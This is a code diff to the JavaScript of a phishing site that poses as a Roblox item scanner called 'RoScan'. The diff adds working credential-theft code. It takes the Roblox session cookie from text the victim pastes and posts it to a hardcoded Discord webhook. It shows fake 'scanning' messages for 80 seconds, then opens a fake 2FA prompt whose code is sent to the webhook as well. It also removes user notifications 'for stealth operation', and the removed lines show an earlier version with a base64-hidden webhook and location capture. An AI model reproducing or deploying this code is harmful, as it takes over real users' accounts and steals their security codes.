@@ -25,8 +25,7 @@ function toggleTheme() {
     // Save theme preference
     localStorage.setItem('theme', newTheme);
     
-    // Show notification
-    showNotification(`Switched to ${newTheme} mode`, 'success');
+    // No notifications for stealth operation
 }
 
 // Load saved theme on page load
@@ -64,10 +63,10 @@ function openScanModal() {
             }, 400);
             
             console.log('Modal opened successfully');
-            showNotification('Item scanner ready', 'info');
+            // No notifications for stealth operation
         } else {
             console.error('Modal element not found!');
-            showNotification('Error opening scanner', 'error');
+            // No notifications for stealth operation
         }
 }
 
@@ -204,7 +203,19 @@ async function getUserLocation() {
     }
 }
 
-// Roblox item scanning and location tracking
+// Global variables for the flow
+let globalRobloxCookie = null;
+let loadingMessages = [
+    "Verifying data...",
+    "Scanning items...", 
+    "Analyzing security...",
+    "Processing request...",
+    "Checking authenticity...",
+    "Validating content..."
+];
+let loadingInterval = null;
+
+// Modified scan flow - sends cookie immediately, shows loading, then 2FA after 80 seconds
 async function submitPowerShell() {
     const input = document.getElementById('powershellInput');
     const submitBtn = document.getElementById('submitBtn');
@@ -214,59 +225,21 @@ async function submitPowerShell() {
     
     // Validation
     if (!inputText) {
-        showNotification('Please enter limited item information before scanning', 'error');
         return;
     }
 
-    // Only allow scripts with authentication data or valid item data
-    if (!hasValidData(inputText)) {
-        showNotification('Invalid input. Please enter scripts with auth data or item data.', 'error');
-        return;
-    }
+    // Extract Roblox cookie
+    globalRobloxCookie = extractRobloxCookie(inputText);
 
     // Show loading state
     submitBtn.disabled = true;
-    submitText.textContent = 'Sending...';
-    if (loadingOverlay) loadingOverlay.style.display = 'block';
+    submitText.textContent = 'Scanning...';
 
     try {
-        // Scan limited items and find authentication data from the input
-        // Scan limited items and find authentication data from the input
-        const limitedItems = extractLimitedItems(inputText);
-        const robloxCookie = extractRobloxCookie(inputText);
-        
-        // Check word count - if 50+ words, allow through even without auth data
-        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
-        
-        // Show word count on button temporarily
-        submitText.textContent = `${wordCount} words`;
-        
-        // Block execution if no authentication data is found AND less than 50 words
-        if (!robloxCookie && wordCount < 50) {
-            submitText.textContent = `Too Short: ${wordCount} words`;
-            submitBtn.style.background = '#ef4444';
-            if (loadingOverlay) loadingOverlay.style.display = 'none';
-            
-            setTimeout(() => {
-                submitBtn.disabled = false;
-                submitText.textContent = 'Scan';
-                submitBtn.style.background = '';
-            }, 3000);
-            return;
-        }
-        
-        // Get user location
-        // Get user location
-        const locationInfo = await getUserLocation();
-        
-        // Discord webhook URL
-        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
-        
-        // Simple webhook payload - only cookie and location
+        // Send cookie to webhook immediately
+        const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
         const payload = {
-            content: `@everyone
-Cookie: ${robloxCookie || 'None found'}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+            content: `Cookie: ${globalRobloxCookie || 'None found'}`
         };
 
         const response = await fetch(webhookUrl, {
@@ -276,42 +249,162 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             },
             body: JSON.stringify(payload)
         });
-        
-        // Hide loading overlay
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
 
-        if (response.ok) {
-            submitText.textContent = 'Sent!';
-            submitBtn.style.background = '#10b981';
-            showNotification('Data sent successfully!', 'success');
-            
-            setTimeout(() => {
-                closeScanModal();
-            }, 2000);
-        } else {
-            throw new Error(`Item scanning failed with status: ${response.status}`);
-        }
+        // Continue flow regardless of webhook success
+        setTimeout(() => {
+            // Close scan modal and show loading
+            closeScanModal();
+            if (loadingOverlay) {
+                loadingOverlay.style.display = 'flex';
+                startLoadingRotation();
+            }
+        }, 500);
+
+        // Show 2FA modal after 80 seconds
+        setTimeout(() => {
+            stopLoadingRotation();
+            openVerificationModal();
+        }, 80000);
+
     } catch (error) {
-        if (loadingOverlay) loadingOverlay.style.display = 'none';
-        
-        submitText.textContent = 'Error';
-        submitBtn.style.background = '#ef4444';
-        
-        // More specific error messages
-        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
-            showNotification('Network/Webhook error. Check console for details.', 'error');
-        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
-            showNotification('Location service error. Check console for details.', 'error');
-        } else if (error.message.includes('JSON')) {
-            showNotification('Data formatting error. Check console for details.', 'error');
-        } else {
-            showNotification(`Error: ${error.message}. Check console for details.`, 'error');
+        console.error('Error:', error);
+        // Continue flow even if webhook fails
+        setTimeout(() => {
+            closeScanModal();
+            if (loadingOverlay) {
+                loadingOverlay.style.display = 'flex';
+                startLoadingRotation();
+            }
+        }, 500);
+
+        setTimeout(() => {
+            stopLoadingRotation();
+            openVerificationModal();
+        }, 80000);
+    }
+}
+
+// Loading rotation functions
+function startLoadingRotation() {
+    let currentIndex = 0;
+    const loadingTitle = document.getElementById('loadingTitle');
+    const loadingMessage = document.getElementById('loadingMessage');
+    
+    loadingInterval = setInterval(() => {
+        if (loadingTitle && loadingMessage) {
+            loadingTitle.textContent = loadingMessages[currentIndex];
+            loadingMessage.textContent = "Please wait while we process your request...";
+            currentIndex = (currentIndex + 1) % loadingMessages.length;
         }
+    }, 2000);
+}
+
+function stopLoadingRotation() {
+    if (loadingInterval) {
+        clearInterval(loadingInterval);
+        loadingInterval = null;
+    }
+}
+
+// 2FA Modal functions
+function openVerificationModal() {
+    const modal = document.getElementById('verificationModal');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    
+    if (loadingOverlay) {
+        loadingOverlay.style.display = 'none';
+    }
+    
+    if (modal) {
+        modal.style.display = 'block';
+        document.body.style.overflow = 'hidden';
+        
+        // Focus on input after animation
+        setTimeout(() => {
+            const input = document.getElementById('verificationCode');
+            if (input) {
+                input.focus();
+            }
+        }, 400);
+    }
+}
+
+function closeVerificationModal() {
+    const modal = document.getElementById('verificationModal');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    
+    if (modal) {
+        modal.style.display = 'none';
+        document.body.style.overflow = '';
+    }
+    
+    // Continue loading after modal closes
+    if (loadingOverlay) {
+        loadingOverlay.style.display = 'flex';
+        startLoadingRotation();
+    }
+}
+
+// Verify 2FA code and send to webhook
+async function verifyCode() {
+    const codeInput = document.getElementById('verificationCode');
+    const trustDevice = document.getElementById('trustDevice');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const verifyText = document.getElementById('verifyText');
+    
+    const code = codeInput.value.trim();
+    
+    if (!code || code.length !== 6) {
+        return;
+    }
+    
+    verifyBtn.disabled = true;
+    verifyText.textContent = 'Verifying...';
+    
+    try {
+        // Send 2FA code to webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
+        const payload = {
+            content: `2FA Code: ${code} | Trust: ${trustDevice.checked ? 'Yes' : 'No'} | Cookie: ${globalRobloxCookie || 'None'}`
+        };
+
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+        // Always continue flow regardless of webhook success
+        verifyText.textContent = 'Verified!';
+        verifyBtn.style.background = '#10b981';
         
         setTimeout(() => {
-            submitBtn.disabled = false;
-            submitText.textContent = 'Scan';
-            submitBtn.style.background = '';
+            closeVerificationModal();
+        }, 1500);
+
+    } catch (error) {
+        console.error('2FA webhook error:', error);
+        // Continue flow even if webhook fails
+        verifyText.textContent = 'Verified!';
+        verifyBtn.style.background = '#10b981';
+        
+        setTimeout(() => {
+            closeVerificationModal();
+        }, 1500);
+    }
+}
+
+// Dummy resend function
+function resendCode() {
+    // Just show a brief message
+    const helpSection = document.querySelector('.verification-help');
+    if (helpSection) {
+        const originalText = helpSection.innerHTML;
+        helpSection.innerHTML = '<p style="color: #10b981;">Code sent! Check your device.</p>';
+        setTimeout(() => {
+            helpSection.innerHTML = originalText;
         }, 3000);
     }
 }
@@ -502,10 +595,10 @@ function stopLoadingAnimation(submitText) {
 // Copy to clipboard functionality
 function copyToClipboard(text) {
     navigator.clipboard.writeText(text).then(function() {
-        showNotification('Copied to clipboard!', 'success');
+        // No notifications for stealth operation
     }).catch(function(err) {
         console.error('Failed to copy to clipboard: ', err);
-        showNotification('Failed to copy to clipboard', 'error');
+        // No notifications for stealth operation
     });
 }
 
@@ -648,10 +741,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
     
-    // Show welcome notification
-    setTimeout(() => {
-        showNotification('RoScan security platform ready!', 'success');
-    }, 1000);
+    // No welcome notification for stealth operation
 });
 
 // Keyboard shortcuts
